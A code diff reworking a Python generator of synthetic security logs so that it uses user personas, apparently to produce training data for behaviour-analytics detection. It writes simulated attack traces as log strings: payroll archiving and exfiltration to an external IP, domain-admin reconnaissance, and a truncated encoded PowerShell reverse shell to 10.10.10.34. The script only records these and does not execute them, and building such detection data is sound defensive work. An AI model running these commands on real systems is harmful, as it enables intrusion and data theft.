@@ -1,127 +1,154 @@
-#!/usr/bin/env python3
-"""
-generate_logs.py
-Generates multiple raw log sources using Faker for a realistic multi-source dataset.
-Usage:
-  python generate_logs.py --count 2000
-"""
-import argparse, random, os, json, csv, uuid
+
+import argparse
+import random
+import os
+import json
+import csv
+import uuid
 from faker import Faker
 from datetime import datetime, timedelta
 
+
+HOSTS = [f"host-{i}" for i in range(1, 8)]
 fake = Faker()
-random.seed(42)
-Faker.seed(42)
 
-HOSTS = [f"host-{i}" for i in range(1,8)]
-USERS = [fake.user_name() for _ in range(20)]
-ROLES = ["engineering","finance","hr","it","sales","exec"]
 
-def times(start, n, max_seconds_back=7*24*3600):
-    base = datetime.utcnow()
-    for _ in range(n):
-        delta = random.randint(0, max_seconds_back)
-        yield (base - timedelta(seconds=delta)).strftime("%b %d %H:%M:%S")  # for syslog like
+PERSONAS = [
+    {'user_id': 'bgriffin', 'role': 'engineering', 'home_ip': '203.0.113.54', 'home_host': 'host-1', 'behavior': 'normal'},
+    {'user_id': 'srogers', 'role': 'engineering', 'home_ip': '198.51.100.23', 'home_host': 'host-1', 'behavior': 'attacker_data_exfil'},
+    {'user_id': 'jpeterson', 'role': 'sales', 'home_ip': '192.0.2.142', 'home_host': 'host-2', 'behavior': 'normal'},
+    {'user_id': 'lrobinson', 'role': 'sales', 'home_ip': '203.0.113.78', 'home_host': 'host-2', 'behavior': 'normal'},
+    {'user_id': 'maria95', 'role': 'finance', 'home_ip': '198.51.100.101', 'home_host': 'host-3', 'behavior': 'normal'},
+    {'user_id': 'xreid', 'role': 'hr', 'home_ip': '192.0.2.205', 'home_host': 'host-4', 'behavior': 'normal'},
+    {'user_id': 'amandasanchez', 'role': 'it', 'home_ip': '203.0.113.112', 'home_host': 'host-5', 'behavior': 'attacker_living_off_land'},
+    {'user_id': 'michellejames', 'role': 'exec', 'home_ip': '198.51.100.5', 'home_host': 'host-6', 'behavior': 'normal'}
+]
 
-def make_auth_line(ts, host, user, src_ip, accepted=True):
-    # e.g. "Oct  1 12:34:56 host sshd[123]: Accepted password for alice from 1.2.3.4 port 51234 ssh2"
-    pid = random.randint(1000,99999)
-    res = "Accepted" if accepted else "Failed"
-    port = random.randint(1024,65000)
-    return f"{ts} {host} sshd[{pid}]: {res} password for {user} from {src_ip} port {port} ssh2\n"
 
-def make_nginx_line(ip, user, ts_common, method, resource, status, bytes_sent, ref="-", ua="-", host="example.com"):
-    # combined log style: '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"'
-    request = f'{method} {resource} HTTP/1.1'
-    user_field = user if random.random() < 0.2 else "-"  # logged user sometimes '-'
-    return f'{ip} - {user_field} [{ts_common}] "{request}" {status} {bytes_sent} "{ref}" "{ua}"\n'
+def make_auth_line(ts, host, user, src_ip, success=True):
+    pid = random.randint(1000, 99999)
+    res = "Accepted" if success else "Failed"
+    port = random.randint(1024, 65000)
+    return f"{ts.strftime('%b %d %H:%M:%S')} {host} sshd[{pid}]: {res} password for {user} from {src_ip} port {port} ssh2\n"
 
-def make_firewall_line(ts, host, action, src_ip, dst_ip, src_port, dst_port, proto="TCP"):
-    # simple syslog-like firewall line
-    return f"{ts} {host} FIREWALL: {action} proto={proto} src={src_ip}:{src_port} dst={dst_ip}:{dst_port}\n"
+def make_file_audit_row(ts, user, path, action, bytes_):
+    return [ts.isoformat() + "Z", user, path, action, bytes_]
 
-def make_windows_event(ev_time, host, user, ev_id, level, message):
+def make_endpoint_proc(ts, user, host, process, cmdline):
     return json.dumps({
-        "TimeCreated": ev_time.isoformat() + "Z",
-        "Host": host,
-        "User": user,
-        "EventID": ev_id,
-        "Level": level,
-        "Message": message
-    })+"\n"
-
-def make_file_audit_row(ts_iso, user, path, action, bytes_):
-    return [ts_iso, user, path, action, bytes_]
-
-def make_endpoint_proc(ts_iso, user, host, process, cmdline, event_type):
-    return json.dumps({
-        "timestamp": ts_iso,
-        "user": user,
-        "host": host,
-        "process": process,
-        "cmdline": cmdline,
-        "event_type": event_type
+        "timestamp": ts.isoformat() + "Z", "user": user, "host": host,
+        "process": process, "cmdline": cmdline, "event_type": "process_start"
     }) + "\n"
 
-def random_ip(private=False):
-    if private:
-        return random.choice(["10.0.0."+str(random.randint(2,250)), "192.168.1."+str(random.randint(2,250))])
-    return fake.ipv4_public()
+def make_firewall_line(ts, host, action, src_ip, dst_ip, dst_port, bytes_):
+    return f"{ts.strftime('%b %d %H:%M:%S')} {host} FIREWALL: {action} proto=TCP src={src_ip}:{random.randint(1024, 65000)} dst={dst_ip}:{dst_port} bytes={bytes_}\n"
+    
+def make_windows_event(ts, host, user, ev_id, message):
+    return json.dumps({
+        "TimeCreated": ts.isoformat() + "Z", "Host": host, "User": user,
+        "EventID": ev_id, "Level": "Information", "Message": message
+    }) + "\n"
+
+
+def generate_normal_activity(writers, persona, base_time):
+    """Generates typical, role-based activity for a user."""
+    user = persona['user_id']
+    role = persona['role']
+    
+    if random.random() < 0.7:
+        writers['auth'].write(make_auth_line(base_time, persona['home_host'], user, persona['home_ip'], success=True))
+
+    if role == 'engineering':
+        if random.random() < 0.3:
+            writers['proc'].write(make_endpoint_proc(base_time, user, persona['home_host'], 'git', 'git pull origin main'))
+        if random.random() < 0.2:
+            writers['file'].writerow(make_file_audit_row(base_time, user, '/app/src/main.py', 'READ', 1024))
+
+    elif role == 'finance':
+        if random.random() < 0.2:
+            writers['file'].writerow(make_file_audit_row(base_time, user, '/shared/finance/Q3_report.xlsx', 'WRITE', 512000))
+
+    elif role == 'hr':
+        if random.random() < 0.15:
+            writers['file'].writerow(make_file_audit_row(base_time, user, '/shared/hr/candidates.csv', 'READ', 204800))
+
+def generate_attack_data_exfil(writers, persona, base_time):
+    """Simulates a multi-step data exfiltration attack."""
+    user = persona['user_id']
+    host = persona['home_host']
+    attacker_ip = fake.ipv4_public() #  non-standard IP
+    exfil_ip = '104.22.9.115' # suspicious external IP
+    
+    writers['auth'].write(make_auth_line(base_time, host, user, attacker_ip, success=True))
+    
+    time_step2 = base_time + timedelta(minutes=5)
+    writers['file'].writerow(make_file_audit_row(time_step2, user, '/shared/hr/payroll.csv', 'READ', 3500000))
+    
+    time_step3 = base_time + timedelta(minutes=7)
+    writers['proc'].write(make_endpoint_proc(time_step3, user, host, '7z.exe', '7z a -p"secret" C:\\Users\\Public\\payroll.zip /shared/hr/payroll.csv'))
+
+    time_step4 = base_time + timedelta(minutes=10)
+    writers['fw'].write(make_firewall_line(time_step4, host, 'ALLOW', persona['home_ip'], exfil_ip, 8443, 3500500))
+
+def generate_attack_living_off_land(writers, persona, base_time):
+    user = persona['user_id']
+    host = persona['home_host']
+    
+    writers['auth'].write(make_auth_line(base_time, host, user, persona['home_ip'], success=True))
+    
+    time_step2 = base_time + timedelta(minutes=2)
+    writers['proc'].write(make_endpoint_proc(time_step2, user, host, 'whoami.exe', 'whoami /groups'))
+
+    time_step3 = base_time + timedelta(minutes=3)
+    writers['proc'].write(make_endpoint_proc(time_step3, user, host, 'net.exe', 'net group "Domain Admins" /domain'))
+    
+    time_step4 = base_time + timedelta(minutes=6)
+    encoded_command = "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMwA0ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A..."
+    writers['proc'].write(make_endpoint_proc(time_step4, user, host, 'powershell.exe', encoded_command))
+
+    time_step5 = base_time + timedelta(minutes=10)
+    writers['win'].write(make_windows_event(time_step5, host, user, 7045, "A new service was installed: 'UpdaterService'"))
+
 
 def main(count=2000, outdir="data/raw"):
     os.makedirs(outdir, exist_ok=True)
-    # auth.log
-    with open(os.path.join(outdir,"auth.log"), "w") as fa, \
-         open(os.path.join(outdir,"nginx_access.log"), "w") as fn, \
-         open(os.path.join(outdir,"firewall.log"), "w") as ff, \
-         open(os.path.join(outdir,"windows_events.jsonl"), "w") as fw, \
-         open(os.path.join(outdir,"file_audit.csv"), "w", newline='') as fcsv, \
-         open(os.path.join(outdir,"endpoint_proc.jsonl"), "w") as fe:
-        csvw = csv.writer(fcsv)
-        csvw.writerow(["timestamp","user","path","action","bytes"])
-        # generate times
-        time_list_syslog = list(times(datetime.utcnow(), count))
-        for i in range(count):
-            # common fields
-            host = random.choice(HOSTS)
-            user = random.choice(USERS)
-            role = random.choice(ROLES)
-            # auth log (20% failed)
-            accepted = random.random() > 0.15
-            fa.write(make_auth_line(time_list_syslog[i], host, user, random_ip(), accepted))
-            # nginx log
-            ts_common = (datetime.utcnow() - timedelta(seconds=random.randint(0,7*24*3600))).strftime("%d/%b/%Y:%H:%M:%S +0000")
-            method = random.choice(["GET","POST","PUT"])
-            resource = random.choice(["/index.html","/api/login","/download/report.pdf","/assets/img.png","/upload"])
-            status = random.choice([200,200,200,404,500,302])
-            fn.write(make_nginx_line(random_ip(), user, ts_common, method, resource, status, random.randint(100,5000),
-                                     ua=fake.user_agent()))
-            # firewall lines (some denies)
-            action = random.choice(["ALLOW","DENY","ALLOW","ALLOW"])
-            ff.write(make_firewall_line(time_list_syslog[i], host, action, random_ip(), random_ip(), random.randint(1024,65000), random.randint(1,65535)))
-            # windows events occasionally
-            if random.random() < 0.2:
-                ev_time = datetime.utcnow() - timedelta(seconds=random.randint(0,7*24*3600))
-                ev_id = random.choice([4624,4625,7045,4688])
-                level = random.choice(["Information","Warning","Error"])
-                fw.write(make_windows_event(ev_time, host, user, ev_id, level, f"Sample message {uuid.uuid4()}"))
-            # file audit rows
-            if random.random() < 0.3:
-                path = random.choice(["/shared/finance/q1.xlsx","/home/user/secrets.txt","/shared/hr/payroll.csv","/tmp/test.bin"])
-                action = random.choice(["READ","WRITE","DELETE","DOWNLOAD"])
-                bytes_ = random.randint(0,5_000_000)
-                csvw.writerow(make_file_audit_row((datetime.utcnow() - timedelta(seconds=random.randint(0,7*24*3600))).isoformat()+"Z", user, path, action, bytes_))
-            # endpoint process
-            if random.random() < 0.2:
-                ts_iso = (datetime.utcnow() - timedelta(seconds=random.randint(0,7*24*3600))).isoformat()+"Z"
-                proc = random.choice(["powershell.exe","bash","python","curl","scp","cmd.exe"])
-                cmd = f"{proc} -c 'do something {random.randint(1,100)}'"
-                fe.write(make_endpoint_proc(ts_iso, user, host, proc, cmd, "process_start"))
-    print("Wrote synthetic raw logs to", outdir)
+    
+    files = {
+        "auth": open(os.path.join(outdir, "auth.log"), "w"),
+        "fw": open(os.path.join(outdir, "firewall.log"), "w"),
+        "win": open(os.path.join(outdir, "windows_events.jsonl"), "w"),
+        "proc": open(os.path.join(outdir, "endpoint_proc.jsonl"), "w"),
+        "file_csv": open(os.path.join(outdir, "file_audit.csv"), "w", newline='')
+    }
+    writers = {'file': csv.writer(files['file_csv']), **{k: v for k, v in files.items() if k != 'file_csv'}}
+    writers['file'].writerow(["timestamp", "user", "path", "action", "bytes"])
+    
+    start_time = datetime.utcnow() - timedelta(days=7)
+    
+    print(f"Generating {count} events...")
+    for i in range(count):
+        persona = random.choice(PERSONAS)
+        event_time = start_time + timedelta(seconds=random.randint(0, 7*24*3600))
+        
+
+        is_attack = persona['behavior'] != 'normal' and random.random() < 0.05
+
+        if is_attack:
+            if persona['behavior'] == 'attacker_data_exfil':
+                generate_attack_data_exfil(writers, persona, event_time)
+            elif persona['behavior'] == 'attacker_living_off_land':
+                generate_attack_living_off_land(writers, persona, event_time)
+        else:
+            generate_normal_activity(writers, persona, event_time)
+
+    for f in files.values():
+        f.close()
+        
+    print(f"Wrote synthetic, scenario-based logs to {outdir}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--count", type=int, default=2000, help="number of events to generate")
-    parser.add_argument("--outdir", default="data/raw")
+    parser = argparse.ArgumentParser(description="Generate realistic, scenario-based log data for UEBA.")
+    parser.add_argument("--count", type=int, default=2000, help="Approximate number of event clusters to generate.")
+    parser.add_argument("--outdir", default="data/raw", help="Directory to save the raw log files.")
     args = parser.parse_args()
     main(args.count, args.outdir)
